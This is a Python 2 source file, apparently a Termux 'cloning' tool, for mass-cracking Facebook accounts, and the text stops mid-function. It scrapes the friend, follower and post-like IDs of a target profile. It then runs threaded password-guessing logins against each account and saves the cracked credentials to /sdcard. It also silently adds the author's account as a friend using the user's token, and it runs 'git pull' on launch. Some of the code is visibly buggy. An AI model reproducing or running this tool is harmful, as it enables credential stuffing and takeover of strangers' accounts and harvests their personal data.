#!/usr/bin/python
# coding=utf-8
# Originally Written By:Jam Shahrukh
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pkg install nodejs")
    os.system("python2 sani.py")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass 
os.system("git pull")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")
 
logo = """
\033[1;92m    .S    .S_SSSs   SSS.        .SSS
\033[1;92m   .SS  .SS~SSSSS   sSSS        SSSs
\033[1;91m   S%S  S%S   SSSS  S%SSS      SSS%S
\033[1;91m   S%S  S%S    S%S  S%S  SS  SS  S%S
\033[1;97m   S&S  S%S•SSSS%S  S%S   s..s   S%S
\033[1;97m   S&S  S&S  SSS%S  S&S    ss    S&S
\033[1;94m   S&S  S&S    S&S  S&S          S&S
\033[1;94m   S&S  S&S    S&S  S&S          S&S
\033[1;93m   d*S  S*S    S&S  S*S          S*S
\033[1;93m  .S*S  S*S    S*S  S*S          S*S
\033[1;96msdSSS   S*S    S*S  S*S          S*S
\033[1;96mYSSY    SSS    S*S  SSS          S*S
\033[1;91m══════════════════════════════════════════════
\033[1;97m➣ Author : Jam Shahrukh
\033[1;97m➣ Github : https://github.com/jam
\033[1;97m➣ Fb Page: Jam Shahrukh Official
\033[1;91m══════════════════════════════════════════════"""
idh = []
back = 0

def tlogin():
	os.system('clear')
	print(logo)
	username = raw_input("[+] TOOL USERNAME: ")
	if username =="jam":
	    os.system('clear')
	    print(logo)
	    print "[✓] TOOL USERNAME: "+username+ " (correct)"
	else:
	    print "[!] Invalid Username."
	    os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
	    time.sleep(1)
	    tlogin()
	    
	passw = raw_input("[+] TOOL PASSWORD: ")
	if passw =="687":
	    os.system('clear')
	    print(logo)
	    print "[✓] TOOL USERNAME: " +username+ " (correct)"
	    print "[✓] TOOL PASSWORD: " +passw+ "  (correct)"
	    os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
	    time.sleep(1)
	    login_choice()
	else:
	    print "[!] Invalid Password."
	    time.sleep(1)
	    tlogin()
	try:
		toket = open('.login.txt','r')
		os.system('python2 sani.py')
	except (KeyError,IOError):
		login_choice()
	else:
		print "[!] Invalid Password"
		time.sleep(1)
		tlogin()

def login_choice():
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
		menu()
	except IOError:
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mLOGIN MENU\033[0;97m")
		print("══════════════════════════════════════════════")
		print("[1] Login with token")
		print("[2] Login with id/pass")
		print("══════════════════════════════════════════════")
		login_select()
def login_select():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	if select =="1":
		login_token()
	elif select =="2":
		login_fb()
	else:
		print("══════════════════════════════════════════════")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		time.sleep(1)
		login_select()
def login_fb():
	os.system("clear")
	print(logo)
	print("\t    \033[1;32mLOGIN WITH ID/PASS\033[0;97m")
	print("══════════════════════════════════════════════")
	id = raw_input(" Id/mail/number: ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password: ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		jam = open(".login.txt","w")
		jam.write(q["loc"])
		jam.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		time.sleep(1)
		print("══════════════════════════════════════════════")
		raw_input("\tPress enter to back ")
		login_choice()
	else:
		print("")
		print("\t    \033[1;31mIncorrect credentials\033[0;97m")
		raw_input("Press enter to try again ")
		login_choice()
def login_token():
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
		time.sleep(1)
		menu()
	except (KeyError , IOError):
	    os.system("clear")
	    print(logo)
	    print("")
	    print("\t    \033[1;32mFB TOKEN LOGIN\033[0;97m")
	    print("")
	    token = raw_input(" Paste token here: ")
	    token_save = open(".login.txt","w")
	    token_save.write(token)
	    token_save.close()
	    time.sleep(1)
	    menu()
def menu():
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		os.system("clear")
		print(logo)
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	try:
		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
		a = json.loads(r.text)
		name = a["name"]
	except KeyError:
		os.system("clear")
		print(logo)
		print("\t    \033[1;31mToken expired\033[0;97m")
		time.sleep(1)
		os.system("rm -rf .login.txt")
		login_choice()
	os.system("clear")
	print(logo)
	print("\t    \033[7m\033[1;32mUser: "+name+"\033[0;97m")
	print("══════════════════════════════════════════════")
	print("[1] Crack 10 pass mode")
	print("[2] Crack 6 pass mode")
	print("[3] Crack 2 pass mode")
	print("[4] Create File")
	print("[5] Extract Group Post Likes")
	print("══════════════════════════════════════════════")
	menu_option()
def menu_option():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		choice_jam()
	elif select =="4":
		ex_id()
	elif select =="5":
	        ex_post()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("\t    \033[7m\033[1;32mNORMAL CRACK MENU\033[0;97m")
	print("══════════════════════════════════════════════")
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[3] Crack file")
	print("[0] Back")
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		pass7 = raw_input(" [7]Password: ")
		pass8 = raw_input(" [8]Password: ")
		pass9 = raw_input(" [9]Password: ")
		pass10 = raw_input(" [10]Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		pass7 = raw_input(" [7]Password: ")
		pass8 = raw_input(" [8]Password: ")
		pass9 = raw_input(" [9]Password: ")
		pass10 = raw_input(" [10]Password: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		pass7 = raw_input(" [7]Password: ")
		pass8 = raw_input(" [8]Password: ")
		pass9 = raw_input(" [9]Password: ")
		pass10 = raw_input(" [10]Password: ")
		try:
			filelist = raw_input("[+] File : ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		crack_select()
	print("Total IDs : "+str(len(id)))
	print("The Process has started")
	print("══════════════════════════════════════════════")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name.lower() + p1
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
				ok = open("/sdcard/ids/Jam-Ok.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
					cp = open("/sdcard/ids/jam_cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower() + p2
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
						ok = open("/sdcard/ids/Jam-Ok.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
							cp = open("/sdcard/ids/jam_cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower() + p3
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;90m[Jam-Ok] "+uid+" | "+pass3)
								ok = open("/sdcard/ids/Jam-Ok.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;97m[Jam-Cp] "+uid+" | "+pass3)
									cp = open("/sdcard/ids/jam_cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;90m[Jam-Ok] "+uid+" | "+pass4)
										ok = open("/sdcard/ids/Jam-Ok.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\033[1;97m[Jam-Cp] "+uid+" | "+pass4)
											cp = open("/sdcard/ids/jam_cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;90m[Jam-Ok] "+uid+" | "+pass5)
												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\033[1;97m[Jam-Cp] "+uid+" | "+pass5)
													cp = open("/sdcard/ids/jam_cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;90m[Jam-Ok] "+uid+" | "+pass6)
														ok = open("/sdcard/ids/jam_ok.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;97m[Jam-Cp] "+uid+" | "+pass6)
															cp = open("/sdcard/ids/jam_cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
													                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7).text
													                q = json.loads(data)
													                if "loc" in q:
														                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass7)
														                ok = open("/sdcard/ids/jam_ok.txt", "a")
														                ok.write(uid+" | "+pass7+"\n")
														                ok.close()
														                oks.append(uid+pass7)
													                else:
														                if "www.facebook.com" in q["error"]:
															                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass7)
															                cp = open("/sdcard/ids/jam_cp.txt","a")
															                cp.write(uid+" | "+pass7+"\n")
															                cp.close()
															                cps.append(uid+pass7)
																else:
													                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8).text
													                                q = json.loads(data)
													                                if "loc" in q:
														                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass8)
														                                ok = open("/sdcard/ids/jam_ok.txt", "a")
														                                ok.write(uid+" | "+pass8+"\n")
														                                ok.close()
														                                oks.append(uid+pass8)
													                                else:
														                                if "www.facebook.com" in q["error"]:
															                                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass8)
															                                cp = open("/sdcard/ids/jam_cp.txt","a")
															                                cp.write(uid+" | "+pass8+"\n")
															                                cp.close()
															                                cps.append(uid+pass8)
																                else:
													                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9).text
													                                                q = json.loads(data)
													                                                if "loc" in q:
														                                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass9)
														                                                ok = open("/sdcard/ids/jam_ok.txt", "a")
														                                                ok.write(uid+" | "+pass9+"\n")
														                                                ok.close()
														                                                oks.append(uid+pass9)
													                                                else:
														                                                if "www.facebook.com" in q["error"]:
															                                                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass9)
															                                                cp = open("/sdcard/ids/jam_cp.txt","a")
															                                                cp.write(uid+" | "+pass9+"\n")
															                                                cp.close()
															                                                cps.append(uid+pass9)
																				else:
													                                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10).text
													                                                                q = json.loads(data)
													                                                                if "loc" in q:
														                                                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass10)
														                                                                ok = open("/sdcard/ids/jam_ok.txt", "a")
														                                                                ok.write(uid+" | "+pass10+"\n")
														                                                                ok.close()
														                                                                oks.append(uid+pass10)
													                                                                else:
														                                                                if "www.facebook.com" in q["error"]:
															                                                                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass10)
															                                                                cp = open("/sdcard/ids/jam_cp.txt","a")
															                                                                cp.write(uid+" | "+pass10+"\n")
															                                                                cp.close()
															                                                                cps.append(uid+pass10)
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("══════════════════════════════════════════════")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("══════════════════════════════════════════════")
	raw_input(" Press enter to back")
	crack()
def ex_id():
    idg=[]
    global token
    try:
    	token = open(".login.txt","r").read()
    except IOError:
    	print("\t    \033[1;31mToken not found\033[0;97m")
    	print("")
    	time.sleep(1)
    	login_choice()
    os.system("clear")
    print(logo)
    print("\t    \033[7m\033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
    print("══════════════════════════════════════════════")
    idh = raw_input(" Input Id: ")
    try:
        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
        q = json.loads(r.text)
        print(" \033[7m\033[1;32mCollecting from: "+q["name"])
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
        raw_input(" Press enter to back")
        crack()
    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open("ids_file.txt","w")
    for i in q["data"]:
        uid = i["id"]
        na = i["name"]
        nm=na.rsplit(" ")[0]
        idg.append(uid+"|"+nm)
        ids.write(uid+"|"+nm + "\n")
    ids.close()
    print("══════════════════════════════════════════════")
    print(" The process has completed")
    print(" Total ids: "+str(len(idg)))
    print("══════════════════════════════════════════════")
    raw_input(" Press enter to download file")
    os.system("cp ids_file.txt /sdcard")
    os.system("rm -rf ids_file.txt")
    print(" File downloaded successfully")
    time.sleep(1)
    menu()
def ex_post():
    idg=[]
    global token
    try:
    	token = open(".login.txt","r").read()
    except IOError:
    	print("\t    \033[1;31mToken not found\033[0;97m")
    	print("")
    	time.sleep(1)
    	login_choice()
    os.system("clear")
    print(logo)
    una = ('100052292505058')
    print("\t    \033[7m\033[1;32mCOLLECT POST LIKES LINKS\033[0;97m")
    print("══════════════════════════════════════════════")
    una = raw_input(" Input Post Id: ")
    try:
        r = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+token, headers=header)
        q = json.loads(r.text)
	print("══════════════════════════════════════════════")
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
        raw_input(" Press enter to back")
        crack()
    r = requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open("likes_post.txt","w")
    for i in q["friends"]["data"]:
        uid = i["id"]
        na = i["name"]
        nm=na.rsplit(" ")[0]
        idg.append(uid+"|"+nm)
        ids.write(uid+"|"+nm + "\n")
    ids.close()
    print("══════════════════════════════════════════════")
    print(" The process has completed")
    print(" Total ids: "+str(len(idg)))
    print("══════════════════════════════════════════════")
    raw_input(" Press enter to download file")
    os.system("cp likes_post.txt /sdcard")
    os.system("rm -rf likes_post.txt")
    print(" File downloaded successfully")
    time.sleep(1)
    menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("\t    \033[7m\033[1;32mMEDIUM CRACK MENU\033[0;97m")
	print("══════════════════════════════════════════════")
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[3] Crack file")
	print("[0] Back")
	print("══════════════════════════════════════════════")
	choice_select()
def choice_select():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("══════════════════════════════════════════════")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
		pass4 = raw_input(" [4]Password: ")
		pass5 = raw_input(" [5]Password: ")
		pass6 = raw_input(" [6]Password: ")
		filelist = raw_input(" Input file: ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("══════════════════════════════════════════════")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select()
	print("Total IDs : "+str(len(id)))
	print("The Process has started")
	print("══════════════════════════════════════════════")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name.lower() + p1
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
					cp = open("/sdcard/ids/jam_cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower() + p2
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
						ok = open("/sdcard/ids/jam_ok.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
							cp = open("/sdcard/ids/jam_cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower() + p3
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;90m[Jam-Ok] "+uid+" | "+pass3)
								ok = open("/sdcard/ids/jam_ok.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;97m[Jam-Cp] "+uid+" | "+pass3)
									cp = open("/sdcard/ids/jam_cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;90m[Jam-Ok] "+uid+" | "+pass4)
										ok = open("/sdcard/ids/jam_ok.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\033[1;97m[Jam-Cp] "+uid+" | "+pass4)
											cp = open("/sdcard/ids/jam_cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;90m[Jam-Ok] "+uid+" | "+pass5)
												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\033[1;97m[Jam-Cp] "+uid+" | "+pass5)
													cp = open("/sdcard/ids/jam_cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;90m[Jam-Ok] "+uid+" | "+pass6)
														ok = open("/sdcard/ids/jam_ok.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;97m[Jam-Cp] "+uid+" | "+pass6)
															cp = open("/sdcard/ids/jam_cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)

																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("══════════════════════════════════════════════")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("══════════════════════════════════════════════")
	raw_input(" Press enter to back")
	choice()
	
def choice_jam():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("\t    \033[7m\033[1;32mFAST CRACK MENU\033[0;97m")
	print("══════════════════════════════════════════════")
	print("[1] Crack public id")
	print("[2] Crack followers")
	print("[3] Crack file")
	print("[0] Back")
	print("══════════════════════════════════════════════")
	choice_select_jam()
def choice_select_jam():
	select = raw_input("\033[1;33mChoose option: \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		pass1 = raw_input(" [1]Password: ")
		pass2 = raw_input(" [2]Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			choice_jam()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")
		print("══════════════════════════════════════════════")
		pass1 = raw_input(" [1]Password: ")
		pass2 = raw_input(" [2]Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("══════════════════════════════════════════════")
			raw_input(" Press enter to back")
			choice_jam()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
		os.system("clear")
		print(logo)
		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")
		print("══════════════════════════════════════════════")
		pass1 = raw_input(" [1]Password: ")
